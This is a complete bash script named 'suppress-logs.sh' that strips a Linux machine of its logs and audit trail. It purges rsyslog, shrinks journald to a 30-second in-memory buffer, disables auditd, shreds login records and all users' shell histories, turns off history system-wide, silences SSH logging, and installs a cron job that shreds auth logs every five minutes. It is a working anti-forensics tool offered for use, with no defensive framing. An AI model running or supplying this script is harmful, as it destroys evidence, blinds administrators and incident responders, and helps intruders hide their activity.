#!/bin/bash
# suppress-logs.sh — disables logging and clears traces on a Linux system

set -euo pipefail

echo "[*] Disabling system logging and clearing traces..."

### 1. Disable and remove rsyslog
if systemctl is-enabled rsyslog &>/dev/null; then
    echo "[*] Stopping rsyslog..."
    systemctl stop rsyslog
    systemctl disable rsyslog
fi

if command -v apt &>/dev/null; then
    apt-get remove --purge -y rsyslog
fi

# Prevent rsyslog from logging auth in case it's reinstalled
echo -e "auth,authpriv.*\t~" > /etc/rsyslog.d/50-disable-auth.conf || true

### 2. Configure systemd-journald for minimal in-memory logging
JOURNAL_CONF="/etc/systemd/journald.conf"
sed -i '/^Storage=/d;/^SystemMaxUse=/d;/^RuntimeMaxUse=/d;/^SystemMaxFileSize=/d;/^MaxRetentionSec=/d' "$JOURNAL_CONF"
cat <<EOF >> "$JOURNAL_CONF"
Storage=volatile
RuntimeMaxUse=1M
SystemMaxUse=1M
SystemMaxFileSize=256K
MaxRetentionSec=30s
EOF
systemctl restart systemd-journald

rm -rf /var/log/journal/*

### 3. Disable auditd and remove audit logs
if systemctl is-active auditd &>/dev/null; then
    systemctl stop auditd
    systemctl disable auditd
fi
rm -rf /var/log/audit/*

### 4. Wipe login records
shred -u /var/log/{wtmp,btmp,lastlog,faillog} 2>/dev/null || true

### 5. Clear all shell histories
find /home /root -type f -name ".*_history" -o -name ".bash_history" -exec shred -u {} \; 2>/dev/null

### 6. Disable shell history globally
cat <<EOF > /etc/profile.d/nohistory.sh
unset HISTFILE
export HISTFILE=/dev/null
export HISTSIZE=0
export HISTFILESIZE=0
EOF
chmod +x /etc/profile.d/nohistory.sh

### 7. Disable PAM lastlog modules
for file in /etc/pam.d/common-session /etc/pam.d/login; do
    [ -f "$file" ] && sed -i 's/^session.*pam_lastlog.so/#&/' "$file"
done

### 8. Clean temporary directories
rm -rf /tmp/* /var/tmp/*

### 9. Mount /tmp and /var/tmp as tmpfs (if not already)
grep -q '^tmpfs\s\+/tmp' /etc/fstab || echo "tmpfs /tmp tmpfs defaults,noatime,mode=1777 0 0" >> /etc/fstab
grep -q '^tmpfs\s\+/var/tmp' /etc/fstab || echo "tmpfs /var/tmp tmpfs defaults,noatime,mode=1777 0 0" >> /etc/fstab

### 10. Minimize SSH logging
SSHD_CONF="/etc/ssh/sshd_config"
sed -i '/^LogLevel/d' "$SSHD_CONF"
echo "LogLevel QUIET" >> "$SSHD_CONF"
systemctl restart sshd

### 11. Setup cron job to clear key log files periodically
CRON_JOB="*/5 * * * * shred -u /var/log/auth.log /var/log/wtmp /var/log/btmp /var/log/lastlog 2>/dev/null || true"
( crontab -l 2>/dev/null | grep -F "$CRON_JOB" >/dev/null ) || (
    ( crontab -l 2>/dev/null; echo "$CRON_JOB" ) | crontab -
)

echo "[✓] Logging disabled. Reboot recommended for full effect."